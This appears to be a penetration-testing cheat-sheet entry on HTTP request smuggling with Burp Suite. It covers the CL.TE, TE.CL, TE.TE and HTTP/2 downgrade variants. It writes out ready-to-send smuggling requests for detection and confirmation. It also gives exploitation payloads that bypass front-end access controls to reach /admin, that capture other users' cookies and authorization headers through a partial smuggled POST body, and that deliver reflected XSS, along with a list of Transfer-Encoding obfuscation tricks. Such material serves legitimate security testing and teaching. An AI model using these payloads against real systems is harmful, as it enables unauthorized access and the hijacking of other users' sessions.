title: Burp Request Smuggling — CL.TE, TE.CL, H2.TE Desync
body: HTTP request smuggling exploits disagreement between a front-end proxy and back-end server about where HTTP requests end. The front-end uses Content-Length; the back-end uses Transfer-Encoding (or vice versa) — the attacker smuggles a prefix into the next victim's request. Impacts: bypass access controls to reach /admin, capture other users' request headers (session tokens), and reflected XSS. HTTP Request Smuggler v3.0 (BApp Store, 2025) automates detection for all variants including H2 downgrade. Manual timing-based detection works in Community.
cmd:
# ══ ⭐ HTTP REQUEST SMUGGLING — front-end / back-end desync ══════════
# Front-end (proxy/CDN) and back-end disagree on where one HTTP request ends.
# Result: attacker "smuggles" a prefix into the next victim's request.
# PortSwigger HTTP Request Smuggler v3.0 (2025): install from BApp Store first.

# ══ PREREQUISITE — WHAT TO LOOK FOR ════════════════════════════════
# Target: any app behind a reverse proxy, CDN, or load balancer
# Indicators: Cloudflare, nginx, HAProxy, Apache mod_proxy, AWS ALB/ELB
# The split between front-end (CL) and back-end (TE) creates the gap.

# ══ VARIANTS ════════════════════════════════════════════════════════
# CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
#   -> front-end forwards a fixed number of bytes; back-end reads chunks
# TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
#   -> front-end strips TE header; back-end reads CL bytes only
# TE.TE: both support TE but one ignores malformed variants
#   -> front-end and back-end disagree on obfuscated TE headers
# H2.CL / H2.TE: HTTP/2 front-end downgrades to HTTP/1 for backend
#   -> HTTP/2 doesn't use CL/TE the same way; desync on downgrade

# ══ STEP 1 — AUTO-DETECT (HTTP Request Smuggler extension) ══════════
# HTTP History -> right-click any POST request -> Extensions
#   -> HTTP Request Smuggler -> Smuggle Probe
# Extension sends timing-based detection payloads for all variants
# Requires Burp Collaborator for "Smuggle Probe" (Pro) OR use manual timing
# Results appear in Extensions -> HTTP Request Smuggler -> Output tab
# Also try: right-click -> Smuggle Attack (CL.TE) or Smuggle Attack (TE.CL)

# ══ STEP 2 — MANUAL TIMING DETECTION (Community safe method) ════════
# In Repeater: CRITICAL SETTINGS before sending any smuggle request:
#   1. Uncheck "Update Content-Length" (Repeater -> gear icon -> uncheck)
#   2. Set protocol to HTTP/1.1 (not HTTP/2)
#
# CL.TE TIMING TEST (front-end uses CL, back-end uses TE):
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
# If front-end uses CL: forwards exactly 4 bytes (stops after "1\r\nA")
# Back-end uses TE: processes chunk "1\r\nA\r\n", then waits for next chunk
# Result: 10+ second TIMEOUT = CL.TE confirmed (backend waiting for more chunks)
#
# TE.CL TIMING TEST (front-end uses TE, back-end uses CL):
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
# Front-end uses TE: sees "0\r\n\r\n" as end-of-body, forwards it
# Back-end uses CL: expects 6 bytes, only got the terminator, waits
# Result: 10+ second TIMEOUT = TE.CL confirmed

# ══ STEP 3 — CONFIRM WITH DIFFERENTIAL RESPONSE ══════════════════════
# Send the smuggle request twice rapidly. If second request gets a different
# response (e.g., 403 or echoes something unexpected), the smuggled prefix
# contaminated the second request -> confirmed exploitable.
#
# CL.TE CONFIRMATION:
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled-test
0

GET /404-that-doesnt-exist HTTP/1.1
Foo: x
# Send twice -> second request should 404 (the smuggled GET fired)

# ══ STEP 4 — EXPLOITATION ════════════════════════════════════════════

# EXPLOIT A: Bypass front-end access controls
# Front-end blocks POST /admin, but you can smuggle it to the back-end directly:
# (CL.TE variant — adjust byte counts for your actual payload)
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
# The back-end sees a valid GET /admin from "localhost" -> access controls bypassed

# EXPLOIT B: Capture other users' requests (session hijacking)
# Smuggle a partial request that the NEXT victim's request completes:
# Their Auth token/cookie gets appended to your smuggled body
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

body=
# The next victim's request fills in the body= field -> their headers (Cookie, Auth) captured

# EXPLOIT C: XSS via reflected request (if request is reflected in response)
# Smuggle a request where the smuggled body contains an XSS payload
# that gets reflected back to the next victim's browser

# ══ H2.CL / H2.TE (HTTP/2 downgrade) ═══════════════════════════════
# If front-end accepts HTTP/2 but downgrades to HTTP/1 for backend:
# In Burp Repeater: switch protocol to HTTP/2 (Inspector panel -> Request attributes)
# H2.CL: send HTTP/2 request with a Content-Length header that mismatches
# HTTP Request Smuggler extension handles H2 variants automatically
http2smugl detect https://$ip   # Python tool for H2 smuggling detection

# ══ TE.TE OBFUSCATION (when both support TE but one ignores malformed) ═
# One of these variants will be ignored by one side:
Transfer-Encoding: xchunked
Transfer-Encoding : chunked       # space before colon
Transfer-Encoding: chunked, chunked  # duplicate
Transfer-Encoding:  chunked       # extra space
Transfer-Encoding: \x09chunked    # tab character
X: Y\r\nTransfer-Encoding: chunked  # header injection

# ══ BURP SETTINGS FOR SMUGGLING ══════════════════════════════════════
# These are critical — wrong settings = missed or false-positive smuggling:
# Repeater -> gear icon -> UNCHECK "Update Content-Length"
#   (Burp auto-correcting CL will break your smuggle payload)
# Connection -> keep-alive (smuggling relies on persistent connections)
# Protocol: HTTP/1.1 (not HTTP/2) for CL/TE tests
warn: CRITICAL Burp setting: UNCHECK 'Update Content-Length' in Repeater before sending any smuggle payload — Burp auto-correcting the header will silently break your test. Use HTTP/1.1 not HTTP/2 for CL.TE/TE.CL tests. The timing-based detection (10+ second timeout) is the safest confirmation method — differential response testing sends two requests and may affect other users in a shared environment. H2.CL/H2.TE requires switching to HTTP/2 in the Inspector panel. The HTTP Request Smuggler extension handles all of this automatically.
